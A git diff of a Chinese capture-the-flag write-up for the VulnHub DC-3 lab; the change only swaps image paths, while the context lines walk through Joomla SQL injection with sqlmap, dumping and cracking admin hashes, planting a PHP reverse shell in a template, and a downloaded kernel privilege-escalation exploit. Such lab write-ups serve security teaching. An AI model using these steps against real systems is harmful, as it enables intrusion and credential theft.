@@ -8,25 +8,25 @@
 
 该靶机在启动时会报一个错误，我这里的错误提示是把`IDE 0:1`移动为`IDE 0:0`
 
-![](D:\stu\vulnhub\DC靶场\pic-3\1.jpg) 
+![](./pic-3/1.jpg) 
 
 # 主机发现
 
 使用`arp-scan -l`或者`netdiscover -r 192.168.10.1/24`
 
-![](D:\stu\vulnhub\DC靶场\pic-3\2.jpg)
+![](./pic-3/2.jpg)
 
 # 信息收集 
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\DC靶场\pic-3\3.jpg)
+![](./pic-3/3.jpg)
 
 ## 网站信息探测
 
 访问80端口默认界面，查看页面源代码也并未发现其他内容
 
-![](D:\stu\vulnhub\DC靶场\pic-3\4.jpg)
+![](./pic-3/4.jpg)
 
 使用`whatweb`尝试进行指纹探测
 
@@ -34,11 +34,11 @@
 whatweb http://192.168.10.10
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-3\5.jpg)
+![](./pic-3/5.jpg)
 
 可以使用`gobuster、dirsearch、dirb、ffuf`等工具进行网站目录爆破
 
-![](D:\stu\vulnhub\DC靶场\pic-3\6.jpg)
+![](./pic-3/6.jpg)
 
 通过这些目录可以进一步确定是`joomla`的CMS，因为一般这种CMS如未修改，其默认就是这些目录构造
 
@@ -50,7 +50,7 @@ whatweb http://192.168.10.10
 joomscan -u http://192.168.10.10
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-3\7.jpg)
+![](./pic-3/7.jpg)
 
 确定版本后，尝试使用`searchsploit`搜索有无该版本的历史漏洞
 
@@ -58,7 +58,7 @@ joomscan -u http://192.168.10.10
 searchsploit joomla 3.7.0
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-3\8.jpg)
+![](./pic-3/8.jpg)
 
 # 漏洞利用
 
@@ -72,7 +72,7 @@ sqlmsqlmap -u "http://192.168.10.10/index.php?option=com_fields&view=fields&layo
 
 使用上面语句，成功获取信息
 
-![](D:\stu\vulnhub\DC靶场\pic-3\10.jpg)
+![](./pic-3/10.jpg)
 
 再次对指定的数据库爆出表
 
@@ -80,7 +80,7 @@ sqlmsqlmap -u "http://192.168.10.10/index.php?option=com_fields&view=fields&layo
  sqlmap -u "http://192.168.10.10/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables --batch
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-3\11.jpg)
+![](./pic-3/11.jpg)
 
 再次针对表爆出元组
 
@@ -88,7 +88,7 @@ sqlmsqlmap -u "http://192.168.10.10/index.php?option=com_fields&view=fields&layo
 sqlmap -u "http://192.168.10.10/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" --columns 
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-3\12.jpg)
+![](./pic-3/12.jpg)
 
 爆出数据
 
@@ -96,7 +96,7 @@ sqlmap -u "http://192.168.10.10/index.php?option=com_fields&view=fields&layout=m
 sqlmap -u "http://192.168.10.10/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" -C username,password --dump
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-3\13.jpg)
+![](./pic-3/13.jpg)
 
 把密码复制到一个文件`hash`中，然后使用`john`进行爆破，解出密码为 `snoopy`
 
@@ -104,21 +104,21 @@ sqlmap -u "http://192.168.10.10/index.php?option=com_fields&view=fields&layout=m
 john hash --wordlist=/usr/share/wordlists/rockyou.txt 
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-3\14.jpg)
+![](./pic-3/14.jpg)
 
 ## ②反弹shell的利用点
 
 然后使用这个用户名`admin`和密码`snoopy`登录网站的后台管理界面`/administrator`
 
-![](D:\stu\vulnhub\DC靶场\pic-3\15.jpg)
+![](./pic-3/15.jpg)
 
 成功登录，测试功能点，寻找利用点
 
 找了一圈，并测试，发现对于扩展中的主题模块方面，有明显的`php`代码，并且支持修改其中的`php`文件内容
 
-![](D:\stu\vulnhub\DC靶场\pic-3\16.jpg)
+![](./pic-3/16.jpg)
 
-![](D:\stu\vulnhub\DC靶场\pic-3\17.jpg)
+![](./pic-3/17.jpg)
 
 那么尝试把`kali`中自带的`php`反弹`shell`代码复制到这里，并进行保存
 
@@ -126,7 +126,7 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 修改其中的`ip`为`kali`的地址即可，端口可采用默认的
 
-![](D:\stu\vulnhub\DC靶场\pic-3\18.jpg)
+![](./pic-3/18.jpg)
 
 然后先在`kali`中使用`nc`开启监听，来获取连接
 
@@ -136,7 +136,7 @@ nc -lvvp 1234
 
 之后在浏览器中访问地址`http://192.168.10.10/templates/beez3`，该位置是放置`beez3`的，并且因为修改的是`index.php`，所以默认就会直接访问，然后触发插入进去的代码，导致反弹
 
-![](D:\stu\vulnhub\DC靶场\pic-3\19.jpg)
+![](./pic-3/19.jpg)
 
 使用`dpkg`命令测试靶机安装了那个版本的`python`，以方便获取一个交互式的界面
 
@@ -150,7 +150,7 @@ dpkg -l | grep python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-3\20.jpg)
+![](./pic-3/20.jpg)
 
 # 提权
 
@@ -168,7 +168,7 @@ cat /etc/issue	#查看系统版本
 cat /ect/os-releae		#查看系统相关信息
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-3\21.jpg)
+![](./pic-3/21.jpg)
 
 使用`searchsploit`寻找系统方面的漏洞，是否对应其版本，发现确实有，那么测试是否可行
 
@@ -176,7 +176,7 @@ cat /ect/os-releae		#查看系统相关信息
 searchsploit linux 4.4.0-21 -t -s
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-3\22.jpg)
+![](./pic-3/22.jpg)
 
 为什么直接使用这个，是因为这里经过筛选，首先就是内核版本范围，筛选出一部分
 
@@ -206,7 +206,7 @@ locate 39772.txt
 
 确定靶机有无条件，发现可以下载，编译，解压
 
-![](D:\stu\vulnhub\DC靶场\pic-3\23.jpg)
+![](./pic-3/23.jpg)
 
 在`kali`中使用`python3`开启简易的`http`服务，并且在压缩包所在目录
 
@@ -233,11 +233,11 @@ chmod +x doubleput
 ./doubleput
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-3\24.jpg)
+![](./pic-3/24.jpg)
 
 查看`flag`
 
-![](D:\stu\vulnhub\DC靶场\pic-3\25.jpg)
+![](./pic-3/25.jpg)
 
 
 
